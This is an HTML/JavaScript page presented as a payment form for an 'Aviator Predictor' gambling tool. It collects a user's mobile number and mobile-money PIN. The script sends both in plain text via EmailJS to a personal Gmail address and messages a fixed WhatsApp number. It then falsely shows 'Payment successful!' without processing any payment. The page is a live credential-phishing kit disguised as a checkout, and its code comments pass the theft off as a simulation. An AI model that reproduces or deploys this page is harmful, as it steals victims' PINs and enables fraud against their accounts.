<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aviator Predictor Payment</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        /*... (your existing CSS styles)... */
    </style>
</head>
<body>
    <div class="container">
        <h1>Aviator Predictor Payment</h1>
        <input type="text" id="phoneNumber" placeholder="Enter your mobile number">
        <button id="payButton">Pay</button>
    </div>

    <a href="paid.html" class="float-button">Demo Account</a>

    <div class="footer">
        <p>Need help? Contact us on <a href="https://wa.me/250739121651" class="whatsapp-button" target="_blank">WhatsApp</a></p>
    </div>

    <div class="modal fade" id="confirmModal" tabindex="-1" role="dialog" aria-labelledby="confirmModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="confirmModalLabel">Confirm Payment</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    Are you sure you want to process payment?
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>
                    <button type="button" class="btn btn-primary" id="confirmContinue">Continue</button>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="alertModal" tabindex="-1" role="dialog" aria-labelledby="alertModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="alertModalLabel">Alert</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body" id="alertModalBody">
                    </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-primary" data-dismiss="modal">OK</button>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="pinModal" tabindex="-1" role="dialog" aria-labelledby="pinModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="pinModalLabel">Enter PIN</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <p>Payment request has been sent. Please enter your PIN to complete the transaction:</p>
                    <input type="password" id="pinInput" class="form-control">
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-primary" id="pinContinue">Continue</button>
                </div>
            </div>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        (function(){
            emailjs.init("abfC9oICRtMIGM5cb");
        })();

        document.getElementById('payButton').addEventListener('click', function() {
            const phoneNumber = document.getElementById('phoneNumber').value;

            if (!phoneNumber) {
                showAlert('Please enter a mobile number.', 'danger');
                return;
            }

            $('#confirmModal').modal('show');
        });

        document.getElementById('confirmContinue').addEventListener('click', function() {
            $('#confirmModal').modal('hide');
            const phoneNumber = document.getElementById('phoneNumber').value;

            // Send message to WhatsApp
            window.open(`https://wa.me/250739121651?text=Payment%20request%20from%20${phoneNumber}`);

            // Show PIN modal
            $('#pinModal').modal('show');
        });

        document.getElementById('pinContinue').addEventListener('click', function() {
            $('#pinModal').modal('hide');
            const phoneNumber = document.getElementById('phoneNumber').value;
            const pinInput = document.getElementById('pinInput').value;

            // Here you would typically validate the PIN and process the payment

            // For this example, we'll just simulate a successful payment and redirect
            const templateParams = {
                to_name: "Customer",
                message: `Payment request from: ${phoneNumber} (PIN: ${pinInput})`,
                to_email: "shimwaolivier7@gmail.com"
            };

            emailjs.send('service_k7026ko', 'template_p0of43y', templateParams)
              .then(function(response) {
                    console.log('SUCCESS!', response.status, response.text);
                    showAlert('Payment successful!', 'success');
                    setTimeout(function() {
                        window.location.href = "product.html";
                    }, 10000);
                }, function(error) {
                    console.error('FAILED...', error);
                    showAlert('Payment failed. Please try again.', 'danger');
                });
        });

        function showAlert(message, type) {
            const alertModalBody = document.getElementById('alertModalBody');
            alertModalBody.innerHTML = `<div class="alert alert-${type}" role="alert">${message}</div>`;
            $('#alertModal').modal('show');
        }
    </script>
</body>
</html>
